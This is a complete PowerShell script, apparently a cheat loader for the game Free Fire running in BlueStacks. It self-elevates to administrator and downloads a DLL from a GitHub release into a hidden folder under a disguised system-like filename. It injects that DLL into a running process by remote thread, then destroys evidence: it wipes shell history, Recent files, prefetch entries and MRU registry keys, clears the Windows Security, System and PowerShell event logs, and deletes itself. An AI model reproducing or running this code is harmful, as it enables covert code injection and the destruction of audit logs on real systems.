# ============================================================
# PowerShell Injection Script (Fixed for iex)
# ============================================================

# === 1. Self-Elevate to Administrator ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# === 2. กำหนดค่าพื้นฐาน ===
$fakeName = "mscories.dll"
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllUrl = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"

# === 3. Fixed LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    
    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    } else {
        $kernel32 = [Win32.Kernel32]
    }
    
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# === 4. Clear Temp Folder ===
Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temp cleared." -ForegroundColor Green
}
catch {
    Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
}

# === 5. สร้างโฟลเดอร์ทำงานและดาวน์โหลด DLL ===
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

$dllPath = Join-Path $workDir $fakeName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($dllUrl, $dllPath)
    $webClient.Dispose()
    
    if (Test-Path $dllPath) {
        Write-Host "[+] Download successful: $dllPath" -ForegroundColor Green
        attrib +h $dllPath
    } else {
        throw "File not found after download."
    }
}
catch {
    Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# === 6. กำหนดเป้าหมายกระบวนการ ===
$targetProcesses = @(
    @{ Name = "HD-Player"; Path = "C:\Program Files\BlueStacks_nxt\HD-Player.exe" },
    @{ Name = "splwow64"; Path = "splwow64.exe" },
    @{ Name = "notepad"; Path = "notepad.exe" }
)

$proc = $null
$targetName = $null

foreach ($t in $targetProcesses) {
    Write-Host "[+] Attempting to launch $($t.Name)..." -ForegroundColor Yellow
    try {
        $existingProc = Get-Process -Name $t.Name -ErrorAction SilentlyContinue
        if ($existingProc) {
            $proc = $existingProc[0]
            Write-Host "[+] Found existing process: $($t.Name) (PID: $($proc.Id))" -ForegroundColor Green
            $targetName = $t.Name
            break
        }
        
        $path = $t.Path
        if ($t.Name -eq "HD-Player" -and -not (Test-Path $path)) {
            $possiblePaths = @(
                "C:\Program Files\BlueStacks_nxt\HD-Player.exe",
                "C:\Program Files\BlueStacks\HD-Player.exe",
                "C:\ProgramData\BlueStacks_nxt\HD-Player.exe"
            )
            foreach ($p in $possiblePaths) {
                if (Test-Path $p) {
                    $path = $p
                    break
                }
            }
        }
        
        if ($t.Name -eq "splwow64" -or $t.Name -eq "notepad") {
            $proc = Start-Process -FilePath $t.Path -WindowStyle Normal -PassThru -ErrorAction SilentlyContinue
        } elseif (Test-Path $path) {
            $proc = Start-Process -FilePath $path -WindowStyle Normal -PassThru -ErrorAction SilentlyContinue
        }
        
        if ($proc) {
            Start-Sleep -Seconds 2
            $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
            if ($proc) {
                $targetName = $t.Name
                Write-Host "[+] Successfully launched: $($t.Name) (PID: $($proc.Id))" -ForegroundColor Green
                break
            }
        }
    }
    catch {
        Write-Host "[!] Error with $($t.Name): $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

if (-not $proc) {
    Write-Host "[!] Failed to launch any target process. Exiting..." -ForegroundColor Red
    exit 1
}

$pid1 = $proc.Id
Write-Host "[+] Target: $targetName (PID: $pid1) [Admin Context]" -ForegroundColor Green

# === 7. Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    
    $LoadLibraryADelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll LoadLibraryA),
        (getDelegateType @([String]) ([IntPtr]))
    )
    
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )
    
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to open process handle. Access Denied?" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
    
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
    
    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero
    
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    
    if (-not $res) {
        Write-Host "[!] Failed to write memory" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Memory Written: $res" -ForegroundColor Green
    
    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
    Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
    
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "[+] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
    } else {
        Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
}

# === 8. Enhanced Cleanup & Anti-Forensics ===
Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan

[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -like "*HD-PLAYER*" -or $_.Name -like "*SPLWOW64*" -or $_.Name -like "*MSCORIES*" } |
            Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
    "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
)
foreach ($key in $mruKeys) {
    if (Test-Path $key) {
        if ($key -like "*MuiCache*") {
            Get-Item -Path $key -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" -or $_ -like "*.tmp*" } | ForEach-Object {
                Remove-ItemProperty -Path $key -Name $_ -Force -ErrorAction SilentlyContinue
            }
        } else {
            Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
}

$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational")
foreach ($logName in $logNames) {
    try {
        wevtutil cl $logName 2>$null
    } catch {}
}

Start-Sleep -Seconds 2
if (Test-Path $workDir) { 
    try { 
        Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
        Write-Host "[+] Removed working directory: $workDir" -ForegroundColor Green
    } catch {}
}

Clear-History -ErrorAction SilentlyContinue

if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
}

[GC]::Collect()
Start-Sleep -Seconds 2

exit